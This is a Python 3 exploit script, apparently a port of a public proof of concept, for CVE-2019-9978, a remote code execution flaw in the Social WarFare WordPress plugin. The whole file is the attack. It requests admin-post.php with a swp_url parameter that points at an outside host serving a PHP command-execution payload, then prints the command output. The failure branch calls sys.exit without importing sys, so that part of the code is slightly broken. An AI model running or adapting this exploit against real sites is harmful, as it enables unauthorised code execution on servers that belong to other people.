#!/usr/bin/python3

'''

This is a python3 conversion of CVE-2019-9978 - (PoC) RCE in Social WarFare Plugin (<=3.5.2)
Original python2 exploit https://github.com/hash3liZer/CVE-2019-9978

	Cheers
	h8handles 
'''

import requests


#change as needed
host = 'http://127.0.0.1/wordpress/'
#the payload.txt file is a php cmd exec with hard coded commands 
path = 'wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.189/payload.txt'
#proxies = {"http":"127.0.0.1:8080"}


r = requests.get(host + path)
if r.status_code == 500:
			print("[*] Success!")
			rr  = r.text.split('\n')
			print(rr[0])
else:
	sys.exit("[<] Exploit failed ")
